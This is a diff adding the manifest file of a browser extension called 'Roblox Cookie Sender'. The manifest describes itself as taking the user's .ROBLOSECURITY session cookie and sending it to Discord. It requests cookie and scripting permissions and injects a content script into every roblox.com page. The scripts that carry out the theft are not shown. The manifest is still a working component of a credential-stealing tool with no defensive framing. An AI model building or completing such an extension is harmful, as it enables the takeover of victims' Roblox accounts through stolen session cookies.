@@ -1,0 +1,24 @@
+{
+    "manifest_version": 3,
+    "name": "Roblox Cookie Sender",
+    "version": "1.0",
+    "description": "Get .ROBLOSECURITY cookie and send it to Discord.",
+    "permissions": [
+        "cookies",
+        "storage",
+        "scripting",
+        "activeTab"
+    ],
+    "background": {
+        "service_worker": "background.js"
+    },
+    "action": {
+        "default_popup": "popup.html"
+    },
+    "content_scripts": [
+        {
+            "matches": ["*://*.roblox.com/*"],
+            "js": ["content.js"]
+        }
+    ]
+} 
